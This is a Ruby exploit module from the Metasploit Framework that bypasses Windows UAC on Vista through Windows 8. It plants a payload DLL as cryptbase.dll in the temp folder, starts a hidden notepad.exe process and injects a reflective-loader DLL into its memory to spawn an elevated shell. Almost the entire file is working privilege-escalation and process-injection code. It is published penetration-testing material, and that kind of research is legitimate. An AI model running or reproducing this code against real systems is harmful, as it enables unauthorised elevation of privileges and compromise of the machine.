##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/exploit/exe'

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::EXE
  include Exploit::FileDropper
  include Post::Common
  include Post::File
  include Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Escalate UAC Protection Bypass In Memory Injection',
      'Description'   => %q{
        This module will bypass Windows UAC by utilizing the trusted publisher
        certificate through process injection. It will spawn a second shell that
        has the UAC flag turned off.

        This module uses memory injection to reduce the number of binaries planted
        on the target machine.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
          'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>',
          'mitnick',
          'mubix', # Port to local exploit
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk' # In memory injection technique
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'        =>
          [
              [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
              [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
          ],
      'DefaultTarget' => 0,
      'References'    => [
        [ 'URL', 'http://www.trustedsec.com/december-2010/bypass-windows-uac/' ]
      ],
      'DisclosureDate'=> "Dec 31 2010"
    ))

  end

  def exploit

    fail_with(Exploit::Failure::None, 'Already in elevated state') if is_admin?

    #
    # Verify use against Vista+
    #
    winver = sysinfo["OS"]
    if winver !~ /Windows Vista|Windows 2008|Windows [78]/
      fail_with(Exploit::Failure::NotVulnerable, "#{winver} is not vulnerable.")
    end

    if is_uac_enabled?
      print_status "UAC is Enabled, checking level..."
    else
      fail_with(Exploit::Failure::NotVulnerable,
        "UAC is not enabled, no reason to run module, exiting...\r\nRun exploit/windows/local/ask to elevate"
      )
    end

    case get_uac_level
    when UACPromptCredsIfSecureDesktop, UACPromptConsentIfSecureDesktop, UACPromptCreds, UACPromptConsent
      fail_with(Exploit::Failure::NotVulnerable,
        "UAC is set to 'Always Notify'\r\nThis module does not bypass this setting, exiting..."
      )
    when UACDefault
      print_good "UAC is set to Default"
      print_status "BypassUAC can bypass this setting, continuing..."
    when UACNoPrompt
      fail_with(Exploit::Failure::NotVulnerable,
        "UAC is not enabled, no reason to run module\r\nRun exploit/windows/local/ask to elevate"
      )
    end

    # Check if you are an admin
    print_status('Checking admin status...')
    admin_group = is_in_admin_group?

    if admin_group.nil?
      print_error('Either whoami is not there or failed to execute')
      print_error('Continuing under assumption you already checked...')
    else
      if admin_group
        print_good('Part of Administrators group! Continuing...')
      else
        print_error('Not in admins group, cannot escalate with this module')
        print_error('Exiting...')
        return
      end
    end

    if get_integrity_level == LowIntegrityLevel
      fail_with(Exploit::Failure::NoAccess, "Cannot BypassUAC from Low Integrity Level")
    end

    path = ::File.join(Msf::Config.data_directory, "post")

    if sysinfo["Architecture"] =~ /x64/i
      bpdll = ::File.join(path, "bypassuac-x64.dll")
    else
      bpdll = ::File.join(path, "bypassuac-x86.dll")
    end

    vprint_status("#{bpdll}")
    print_status("Uploading the bypass UAC DLL to the filesystem...")

    tmpdir = session.fs.file.expand_path("%TEMP%")
    payload = generate_payload_dll
    write_file("#{tmpdir}\\cryptbase.dll", payload)

    vprint_status("Uploaded the UAC DLL to the filesystem....")
    register_file_for_cleanup("#{tmpdir}\\cryptbase.dll")

    dll = ''
    File.open( bpdll, "rb" ) { |f| dll += f.read(f.stat.size) }

    pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )

    offset = nil
    pe.exports.entries.each do |entry|
      if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
        offset = pe.rva_to_file_offset( entry.rva )
        break
      end
    end

    unless offset
      fail_with(Exploit::Failure::Unknown, "Failed to obtain offset from DLL file.")
    end

    target_exe = "#{client.fs.file.expand_path("%windir%")}\\System32\\notepad.exe"
    proc = client.sys.process.execute(target_exe, nil, {'Hidden' => true })

    pid = proc.pid
    print_status("Opening process #{pid}")
    host_process = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
    print_status("Allocating memory in procees #{pid}")
    mem = host_process.memory.allocate(dll.length + (dll.length % 1024))
    # Ensure memory is set for execution
    host_process.memory.protect(mem)
    vprint_status("Allocated memory at address #{"0x%.8x" % mem}, for #{dll.length} bytes")
    print_status("Writing the payload into memory")
    host_process.memory.write(mem, dll)
    print_status("Executing payload")
    host_process.thread.create(mem+offset, 0)
    print_good("Successfully injected payload in to process: #{pid}")
  end
end

